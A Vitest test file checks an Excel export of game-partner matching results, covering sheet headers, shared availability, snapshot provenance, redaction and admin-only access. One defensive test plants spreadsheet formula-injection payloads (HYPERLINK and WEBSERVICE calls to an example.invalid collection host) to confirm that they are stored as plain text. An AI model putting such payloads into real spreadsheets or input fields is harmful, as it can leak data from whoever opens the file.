import ExcelJS from "exceljs"
import { beforeEach, describe, expect, it, vi } from "vitest"

const mocks = vi.hoisted(() => ({ admin: vi.fn(), from: vi.fn(), snapshot: vi.fn() }))
vi.mock("@/lib/auth/admin", () => ({ requireAdmin: mocks.admin }))
vi.mock("@/lib/supabase/admin", () => ({ createAdminClient: () => ({ from: mocks.from }) }))
vi.mock("./input-snapshot-reader", async (original) => ({
  ...await original<typeof import("./input-snapshot-reader")>(), fetchMatchingInputSnapshot: mocks.snapshot,
}))
import { buildSessionExportWorkbook } from "./session-export"
import type { MatchingInputSnapshot } from "./input-snapshot-reader"

let tables: Record<string, any[]>
let tableErrors: Record<string, Error>
let queries: Array<{ table: string; select?: string; memberIds?: string[]; filterKey?: string; limit?: number }>
const capturedAt = "2026-10-23T01:00:00Z"
const uuid = (number: number) => `10000000-0000-4000-8000-${String(number).padStart(12, "0")}`
const ids = { a: uuid(1), b: uuid(2), c: uuid(3), d: uuid(4), later: uuid(5) }
const numberOf = (number: number) => `ZXS_${String(number).padStart(3, "0")}`
const sheetHeaders = {
  双人本配对结果: ["玩家姓名1", "玩家编号1", "性别偏向1", "玩家姓名2", "玩家编号2", "性别偏向2", "类型", "性别偏向", "best_slot", "双人所有可用时间段", "total_score", "备注", "input_source", "captured_at"],
  多人本配对结果: ["组内玩家所有姓名", "组内玩家所有编号", "类型", "性别偏向（偏向男生人数vs偏向女生人数）", "best_slot", "多人组内所有可用共同时间段", "total_score", "备注", "input_source", "captured_at"],
  未匹配名单: ["玩家姓名", "玩家编号", "类型", "性别偏向", "备注", "input_source", "captured_at"],
  结果发布: ["组别", "类型", "人数", "玩家姓名", "玩家编号", "推荐时间", "共同可用时间段"],
} as const
const commonAvailability = { "2026-10-25": ["下午", "晚上"], "2026-10-26": ["上午"] }

function member(id: string, name: string, memberNumber: string | null) {
  return { id, member_number: memberNumber, member_identity: { full_name: name, gender: "不应导出的本人性别" } }
}
function inputSnapshot(): MatchingInputSnapshot {
  return { snapshot_id: "input", captured_at: capturedAt, status: "sealed", source: { submissions: [
    { member_id: ids.a, game_type_pref: "双人", gender_pref: "女", message: "甲的快照留言", availability: commonAvailability,
      member: { member_number: "ZXS_999", member_identity: { full_name: "不应复原的旧姓名" } } },
    { member_id: ids.b, game_type_pref: "双人", gender_pref: "都可以", message: "乙的快照留言", availability: commonAvailability },
    { member_id: ids.c, game_type_pref: "多人", gender_pref: "女", message: "原始备注", availability: commonAvailability,
      import_metadata: { source: "current", normalized_name: "c", raw_first_choice: "原始第一志愿" } },
  ] }, engine_input: { candidates: [ids.a, ids.b, ids.c].map((submissionId) => ({ submissionId })) } }
}
function snapshotFor(submissions: MatchingInputSnapshot["source"]["submissions"]): MatchingInputSnapshot {
  return { ...inputSnapshot(), source: { submissions }, engine_input: { candidates: submissions.map(({ member_id }) => ({ submissionId: member_id })) } }
}
function rowsOf(sheet: ExcelJS.Worksheet): Record<string, unknown>[] {
  const headers = sheet.getRow(1).values as string[]
  return Array.from({ length: sheet.rowCount - 1 }, (_, index) => {
    const row = sheet.getRow(index + 2)
    return Object.fromEntries(headers.slice(1).map((header, cell) => [header, row.getCell(cell + 1).value]))
  })
}
function rows(book: ExcelJS.Workbook, name: keyof typeof sheetHeaders) {
  const sheet = book.getWorksheet(name)
  expect(sheet, `${name} sheet`).toBeDefined()
  return rowsOf(sheet!)
}
async function workbook() {
  const result = await buildSessionExportWorkbook("session")
  const book = new ExcelJS.Workbook()
  await book.xlsx.load(result.buffer as never)
  return book
}
function expectFourSheets(book: ExcelJS.Workbook) {
  expect(book.worksheets.map(({ name }) => name)).toEqual(Object.keys(sheetHeaders))
  for (const [name, expected] of Object.entries(sheetHeaders)) {
    expect((book.getWorksheet(name)!.getRow(1).values as string[]).slice(1)).toEqual(expected)
  }
}
function textCells(sheet: ExcelJS.Worksheet) {
  return rowsOf(sheet).flatMap((row) => Object.values(row)).map((value) => String(value ?? "")).join("\n")
}
function expectDateAndWeekday(value: unknown, date: string) {
  expect(String(value)).toContain(date)
  expect(String(value)).toMatch(/周[一二三四五六日天]|星期[一二三四五六日天]|[月火水木金土日]曜日/)
}

beforeEach(() => {
  vi.resetAllMocks()
  queries = []
  tableErrors = {}
  tables = {
    match_sessions: [{ id: "session", session_name: "测试批次", status: "draft", round_id: "round", round: { round_name: "本轮" } }],
    match_results: [{ id: "result-ab", rank: 1, status: "draft", member_a_id: ids.a, member_b_id: ids.b,
      best_slot: "2026-10-25_晚上", total_score: 55 }],
    unmatched_diagnostics: [{ member_id: ids.c, reason: "无合适搭档", details: { count: 0 } }],
    match_round_submissions: [
      { member_id: ids.a, game_type_pref: "双人", gender_pref: "男", message: "甲的后改留言", availability: commonAvailability },
      { member_id: ids.b, game_type_pref: "双人", gender_pref: "男", message: "乙的后改留言", availability: commonAvailability },
      { member_id: ids.c, game_type_pref: "双人", gender_pref: "男", message: "后改备注", availability: commonAvailability },
      { member_id: ids.d, game_type_pref: "都可以", gender_pref: "都可以", message: "后加手动成员", availability: commonAvailability },
      { member_id: ids.later, message: "尚未参与的新报名者", availability: commonAvailability },
    ],
    members: Object.entries(ids).map(([key, id], index) => member(id, `当前姓名-${key}`, numberOf(index + 1))),
  }
  mocks.admin.mockResolvedValue({ id: "admin", role: "super_admin" })
  mocks.snapshot.mockResolvedValue(inputSnapshot())
  mocks.from.mockImplementation((table: string) => {
    const request: (typeof queries)[number] = { table }
    queries.push(request)
    let single = false
    const query: any = {
      select: (columns: string) => { request.select = columns; return query },
      eq: () => query, order: () => query,
      limit: (count: number) => { request.limit = count; return query },
      in: (key: string, values: string[]) => { request.memberIds = values; request.filterKey = key; return query },
      single: () => { single = true; return query },
      then: (resolve: (response: unknown) => unknown, reject: (error: unknown) => unknown) => {
        let data = tables[table] ?? []
        if (request.memberIds) data = data.filter((row) => request.memberIds!.includes(row[request.filterKey!]))
        if (request.limit !== undefined) data = data.slice(0, request.limit)
        return Promise.resolve({ data: single ? data[0] : data, error: tableErrors[table] ?? null }).then(resolve, reject)
      },
    }
    return query
  })
})

describe("session export workbook contract", () => {
  it("exports exactly four sheets with the confirmed column names and member numbers", async () => {
    const book = await workbook()
    expectFourSheets(book)
    expect(rows(book, "双人本配对结果")).toHaveLength(1)
    expect(rows(book, "多人本配对结果")).toEqual([])
    expect(rows(book, "双人本配对结果")[0]).toMatchObject({
      玩家姓名1: "当前姓名-a", 玩家编号1: "ZXS_001", 性别偏向1: "偏向女生",
      玩家姓名2: "当前姓名-b", 玩家编号2: "ZXS_002", 性别偏向2: "不限",
      类型: "双人本", total_score: 55, input_source: "初始批次输入快照", captured_at: capturedAt,
    })
    expect(rows(book, "未匹配名单")[0]).toMatchObject({ 玩家姓名: "当前姓名-c", 玩家编号: "ZXS_003", 类型: "多人本", 性别偏向: "偏向女生" })
    for (const sheet of book.worksheets) {
      expect(textCells(sheet)).not.toMatch(/[0-9a-f]{8}-(?:[0-9a-f]{4}-){3}[0-9a-f]{12}/i)
      expect(textCells(sheet)).not.toContain("不应复原的旧姓名")
      expect(textCells(sheet)).not.toContain("ZXS_999")
      expect(textCells(sheet)).not.toContain("不应导出的本人性别")
    }
    expect(queries.find((query) => query.table === "members")?.select).toContain("member_number")
  })

  it.each([3, 6, 8, 13])("keeps all %i group names and numbers in the same order, including the last member", async (size) => {
    const groupIds = Array.from({ length: size }, (_, index) => uuid(index + 100))
    const names = groupIds.map((_, index) => `成员姓名${String(index + 1).padStart(2, "0")}`)
    const numbers = groupIds.map((_, index) => numberOf(index + 100))
    tables.match_results = [{ rank: 1, status: "draft", member_a_id: groupIds[0], member_b_id: groupIds[1],
      group_members: groupIds, best_slot: "2026-10-25_晚上", total_score: 72.125 }]
    tables.unmatched_diagnostics = []
    tables.members = groupIds.map((id, index) => member(id, names[index], numbers[index]))
    mocks.snapshot.mockResolvedValue(snapshotFor(groupIds.map((member_id, index) => ({ member_id, availability: commonAvailability,
      game_type_pref: "多人", gender_pref: index % 3 === 0 ? "男" : index % 3 === 1 ? "女" : "都可以",
      import_metadata: { source: index === size - 1 ? "temp" : "current", normalized_name: member_id },
    }))))
    const book = await workbook()
    expectFourSheets(book)
    expect(rows(book, "双人本配对结果")).toEqual([])
    const row = rows(book, "多人本配对结果")[0]
    expect(row).toMatchObject({ 类型: "多人本", total_score: 72.125, input_source: "初始批次输入快照", captured_at: capturedAt })
    expect(String(row.组内玩家所有姓名).split("\n")).toEqual(names)
    expect(String(row.组内玩家所有编号).split("\n")).toEqual(numbers)
    const published = rows(book, "结果发布")
    expect(published).toHaveLength(1)
    expect(published[0]).toMatchObject({ 类型: "多人本", 人数: size })
    expect(String(published[0].玩家姓名).split("\n")).toEqual(names)
    expect(String(published[0].玩家编号).split("\n")).toEqual(numbers)
    expect(queries.some((query) => query.table === "match_round_submissions")).toBe(false)
  })

  it("keeps all four header-only sheets when the batch has no cohort", async () => {
    tables.match_results = []
    tables.unmatched_diagnostics = []
    mocks.snapshot.mockResolvedValue(snapshotFor([]))
    const book = await workbook()
    expectFourSheets(book)
    for (const sheet of book.worksheets) expect(sheet.rowCount).toBe(1)
    expect(queries.some((query) => query.table === "members")).toBe(false)
  })

  it("uses only the intersection of both players' availability and keeps dates readable", async () => {
    const snapshot = inputSnapshot()
    snapshot.source.submissions[0].availability = { "2026-10-25": ["上午", "下午", "晚上"], "2026-10-27": ["晚上"] }
    snapshot.source.submissions[1].availability = { "2026-10-25": ["下午", "晚上"], "2026-10-28": ["上午"] }
    mocks.snapshot.mockResolvedValue(snapshot)
    const book = await workbook()
    const row = rows(book, "双人本配对结果")[0]
    expectDateAndWeekday(row.best_slot, "2026-10-25")
    expect(String(row.best_slot)).toContain("晚上")
    const available = String(row.双人所有可用时间段)
    expectDateAndWeekday(available, "2026-10-25")
    expect(available).toContain("下午")
    expect(available).toContain("晚上")
    expect(available).not.toContain("上午")
    expect(available).not.toContain("2026-10-27")
    expect(available).not.toContain("2026-10-28")
    expect(available.match(/2026-10-25/g)).toHaveLength(1)
    expect(rows(book, "结果发布")[0].共同可用时间段).toBe(row.双人所有可用时间段)
  })

  it("intersects availability across every group member, rather than just the first pair", async () => {
    tables.match_results = [{ rank: 1, status: "draft", member_a_id: ids.a, member_b_id: ids.b, group_members: [ids.a, ids.b, ids.c], total_score: 60 }]
    const snapshot = inputSnapshot()
    snapshot.source.submissions[2].availability = { "2026-10-25": ["晚上"] }
    mocks.snapshot.mockResolvedValue(snapshot)
    const book = await workbook()
    const available = String(rows(book, "多人本配对结果")[0].多人组内所有可用共同时间段)
    expect(available).toContain("2026-10-25")
    expect(available).toContain("晚上")
    expect(available).not.toContain("下午")
    expect(available).not.toContain("2026-10-26")
    expect(rows(book, "未匹配名单")).toEqual([])
  })

  it("counts partner preferences as male/female/unrestricted and keeps missing answers separate", async () => {
    const groupIds = Array.from({ length: 5 }, (_, index) => uuid(index + 20))
    tables.match_results = [{ rank: 1, status: "draft", group_members: groupIds, member_a_id: groupIds[0], total_score: 60 }]
    tables.unmatched_diagnostics = []
    tables.members = groupIds.map((id, index) => member(id, `组员${index}`, numberOf(index + 20)))
    mocks.snapshot.mockResolvedValue(snapshotFor(groupIds.map((member_id, index) => ({ member_id, availability: commonAvailability,
      gender_pref: ["男", "男", "女", "都可以", null][index],
    }))))
    const row = rows(await workbook(), "多人本配对结果")[0]
    const counts = String(row["性别偏向（偏向男生人数vs偏向女生人数）"])
    expect(counts).toMatch(/男[^0-9]*2/)
    expect(counts).toMatch(/女[^0-9]*1/)
    expect(counts).toMatch(/(?:不限|都可以)[^0-9]*1/)
    expect(counts).toMatch(/未填写[^0-9]*1/)
  })

  it("keeps numeric scores numeric and publication free of private scores, comments and UUIDs", async () => {
    tables.match_results[0].total_score = 73.625
    const book = await workbook()
    expect(rows(book, "双人本配对结果")[0].total_score).toBe(73.625)
    const published = rows(book, "结果发布")
    expect(published).toHaveLength(1)
    expect(published[0]).toMatchObject({ 类型: "双人本", 人数: 2 })
    expect(String(published[0].玩家姓名).split("\n")).toEqual(["当前姓名-a", "当前姓名-b"])
    expect(String(published[0].玩家编号).split("\n")).toEqual(["ZXS_001", "ZXS_002"])
    const text = textCells(book.getWorksheet("结果发布")!)
    expect(text).toContain("当前姓名-a")
    expect(text).toContain("ZXS_001")
    for (const forbidden of ["total_score", "73.625", "甲的快照留言", "乙的快照留言", "无合适搭档", "input_source", capturedAt, ...Object.values(ids)]) {
      expect(text).not.toContain(forbidden)
    }
  })

  it("writes malicious equals-prefixed names and comments as literal text, never Excel formulas", async () => {
    const name = '=HYPERLINK("https://example.invalid/collect","name")'
    const comment = '=WEBSERVICE("https://example.invalid/private")'
    tables.members[0].member_identity.full_name = name
    const snapshot = inputSnapshot()
    snapshot.source.submissions[0].message = comment
    mocks.snapshot.mockResolvedValue(snapshot)
    const book = await workbook()
    expect(rows(book, "双人本配对结果")[0].玩家姓名1).toBe(name)
    expect(String(rows(book, "双人本配对结果")[0].备注)).toContain(comment)
    for (const sheet of book.worksheets) {
      sheet.eachRow((row) => row.eachCell((cell) => {
        expect(cell.type).not.toBe(ExcelJS.ValueType.Formula)
        expect(typeof cell.value === "object" && cell.value !== null && "formula" in cell.value).toBe(false)
      }))
    }
  })
})

describe("session export cohort and input provenance", () => {
  it("exports captured answers and current names after later answers change, merging reason with unmatched comments", async () => {
    const book = await workbook()
    const unmatched = rows(book, "未匹配名单")[0]
    expect(unmatched).toMatchObject({ 玩家编号: "ZXS_003", 类型: "多人本", 性别偏向: "偏向女生", input_source: "初始批次输入快照", captured_at: capturedAt })
    expect(String(unmatched.备注)).toContain("无合适搭档")
    expect(String(unmatched.备注)).toContain("原始备注")
    expect(String(unmatched.备注)).not.toContain("后改备注")
    const matchedNotes = String(rows(book, "双人本配对结果")[0].备注)
    expect(matchedNotes).toMatch(/当前姓名-a[\s\S]*甲的快照留言[\s\S]*当前姓名-b[\s\S]*乙的快照留言/)
    expect(queries.some((query) => query.table === "match_round_submissions")).toBe(false)
  })

  it("keeps later manual additions, removes stale matched diagnostics and excludes unrelated later submissions", async () => {
    tables.match_results[0].member_b_id = ids.d
    tables.unmatched_diagnostics.push({ member_id: ids.d, reason: "人工调整" })
    const book = await workbook()
    const matched = rows(book, "双人本配对结果")[0]
    expect(matched).toMatchObject({ 玩家编号2: "ZXS_004", input_source: "含后续人工调整当前资料" })
    expect(String(matched.备注)).toContain("当前姓名-d")
    expect(String(matched.备注)).toContain("后加手动成员")
    const unmatched = rows(book, "未匹配名单")
    expect(unmatched.map((row) => row.玩家编号).sort()).toEqual(["ZXS_002", "ZXS_003"])
    expect(unmatched.some((row) => row.玩家编号 === "ZXS_004" || row.玩家编号 === "ZXS_005")).toBe(false)
    const liveReads = queries.filter((query) => query.table === "match_round_submissions" && query.memberIds)
    expect(liveReads).toHaveLength(1)
    expect(liveReads[0].memberIds).toEqual([ids.d])
    expect(liveReads[0].select).toContain("availability")
  })

  it("retains snapshot candidates with no results or diagnostics as unmatched", async () => {
    tables.match_results = []
    tables.unmatched_diagnostics = []
    const book = await workbook()
    expect(rows(book, "双人本配对结果")).toEqual([])
    expect(rows(book, "多人本配对结果")).toEqual([])
    expect(rows(book, "结果发布")).toEqual([])
    expect(rows(book, "未匹配名单").map((row) => row.玩家编号).sort()).toEqual(["ZXS_001", "ZXS_002", "ZXS_003"])
  })

  it("does not add snapshot submissions excluded from the original candidate cohort", async () => {
    const snapshot = inputSnapshot()
    snapshot.source.submissions.push({ member_id: ids.later, message: "被排除的报名", availability: commonAvailability })
    mocks.snapshot.mockResolvedValue(snapshot)
    const book = await workbook()
    for (const sheet of book.worksheets) expect(textCells(sheet)).not.toContain("ZXS_005")
  })

  it("excludes cancelled matches from paired and publication sheets, keeping cancelled-only members unmatched", async () => {
    tables.match_results = [
      { rank: 1, status: "cancelled", member_a_id: ids.a, member_b_id: ids.b, total_score: 95 },
      { rank: 2, status: "confirmed", member_a_id: ids.a, member_b_id: ids.d, total_score: 60 },
    ]
    tables.unmatched_diagnostics.push({ member_id: ids.a, reason: "过期未匹配诊断" })
    const book = await workbook()
    expect(rows(book, "双人本配对结果")).toHaveLength(1)
    expect(rows(book, "双人本配对结果")[0]).toMatchObject({ 玩家编号1: "ZXS_001", 玩家编号2: "ZXS_004", total_score: 60 })
    expect(rows(book, "结果发布")).toHaveLength(1)
    expect(rows(book, "未匹配名单").map((row) => row.玩家编号).sort()).toEqual(["ZXS_002", "ZXS_003"])
  })

  it("includes a cancelled manual addition in unmatched cohort even without a snapshot candidate or diagnostic", async () => {
    tables.match_results.push({ rank: 2, status: "cancelled", member_a_id: ids.d, member_b_id: null })
    const book = await workbook()
    const row = rows(book, "未匹配名单").find((item) => item.玩家编号 === "ZXS_004")
    expect(row).toMatchObject({ 玩家姓名: "当前姓名-d", input_source: "后续人工调整当前资料" })
    expect(String(row?.备注)).toContain("后加手动成员")
  })

  it("does not repeat already paired members because of stale unmatched diagnostics", async () => {
    tables.unmatched_diagnostics.push({ member_id: ids.a, reason: "过期诊断" }, { member_id: ids.b, reason: "另一条过期诊断" })
    expect(rows(await workbook(), "未匹配名单").map((row) => row.玩家编号)).toEqual(["ZXS_003"])
  })

  it("fails closed when two active results contain the same member", async () => {
    tables.match_results.push({ rank: 2, status: "draft", member_a_id: ids.a, member_b_id: ids.d })
    await expect(workbook()).rejects.toThrow()
  })

  it.each([{ groupMembers: [ids.a] }, { groupMembers: [ids.a, ids.b] }])("rejects nonempty historical group_members of invalid size: $groupMembers", async ({ groupMembers }) => {
    tables.match_results[0].group_members = groupMembers
    await expect(workbook()).rejects.toThrow()
  })

  it("preserves explicit legacy fallback and selects availability without including unrelated new submissions", async () => {
    mocks.snapshot.mockResolvedValue(null)
    const book = await workbook()
    const unmatched = rows(book, "未匹配名单")
    expect(unmatched).toHaveLength(1)
    expect(unmatched[0]).toMatchObject({ 玩家编号: "ZXS_003", 类型: "双人本", input_source: "历史批次当前资料（无快照）" })
    expect(String(unmatched[0].备注)).toContain("后改备注")
    const liveRead = queries.find((query) => query.table === "match_round_submissions" && query.select !== "import_metadata")
    expect(liveRead?.select).toContain("availability")
    expect(String(rows(book, "双人本配对结果")[0].双人所有可用时间段)).toContain("2026-10-25")
    for (const sheet of book.worksheets) expect(textCells(sheet)).not.toContain("ZXS_005")
  })

  it("does not rebuild redacted preference, availability or comments from live forms or captured payloads", async () => {
    mocks.snapshot.mockResolvedValue({ ...inputSnapshot(), status: "redacted" })
    const book = await workbook()
    const unmatched = rows(book, "未匹配名单")[0]
    expect(unmatched).toMatchObject({ 类型: "未填写", 性别偏向: "未填写", input_source: "输入快照已脱敏" })
    const matched = rows(book, "双人本配对结果")[0]
    expect(matched).toMatchObject({ 性别偏向1: "未填写", 性别偏向2: "未填写", input_source: "输入快照已脱敏" })
    expect(String(matched.双人所有可用时间段 ?? "")).not.toContain("2026-10-25")
    for (const sheet of book.worksheets) for (const secret of ["甲的快照留言", "乙的快照留言", "原始备注", "后改备注", "后加手动成员"]) {
      expect(textCells(sheet)).not.toContain(secret)
    }
    expect(queries.some((query) => query.table === "match_round_submissions")).toBe(false)
  })

  it.each(["missing", "disjoint"] as const)("does not invent common availability when input is %s", async (kind) => {
    const snapshot = inputSnapshot()
    if (kind === "missing") delete snapshot.source.submissions[1].availability
    else snapshot.source.submissions[1].availability = { "2026-10-28": ["上午"] }
    mocks.snapshot.mockResolvedValue(snapshot)
    const book = await workbook()
    const common = String(rows(book, "双人本配对结果")[0].双人所有可用时间段 ?? "")
    expect(common).not.toMatch(/2026-10-(25|26|28)/)
    expect(String(rows(book, "结果发布")[0].共同可用时间段 ?? "")).not.toMatch(/2026-10-(25|26|28)/)
  })

  it("does not substitute UUIDs or captured stale identity when current name or number is missing", async () => {
    tables.members[0] = { id: ids.a, member_number: null, member_identity: null }
    const book = await workbook()
    const row = rows(book, "双人本配对结果")[0]
    expect(String(row.玩家姓名1 ?? "")).not.toContain(ids.a)
    expect(String(row.玩家编号1 ?? "")).not.toContain(ids.a)
    expect(String(row.玩家编号1 ?? "")).not.toContain("ZXS_999")
    expect(String(row.玩家姓名1 ?? "")).not.toContain("不应复原的旧姓名")
    for (const sheet of book.worksheets) expect(textCells(sheet)).not.toContain(ids.a)
  })

  it("fails closed on member lookup errors instead of silently exporting incomplete identity", async () => {
    tableErrors.members = new Error("member lookup unavailable")
    await expect(workbook()).rejects.toThrow("member lookup unavailable")
  })

  it("keeps raw exports super-admin only and fails closed on snapshot failures", async () => {
    mocks.admin.mockResolvedValue({ id: "admin", role: "admin" })
    await expect(workbook()).rejects.toThrow("仅超级管理员")
    expect(mocks.from).not.toHaveBeenCalled()
    expect(mocks.snapshot).not.toHaveBeenCalled()
    mocks.admin.mockResolvedValue({ id: "admin", role: "super_admin" })
    mocks.snapshot.mockRejectedValue(new Error("snapshot unavailable"))
    await expect(workbook()).rejects.toThrow("snapshot unavailable")
    expect(queries.some((query) => query.table === "match_round_submissions")).toBe(false)
  })
})
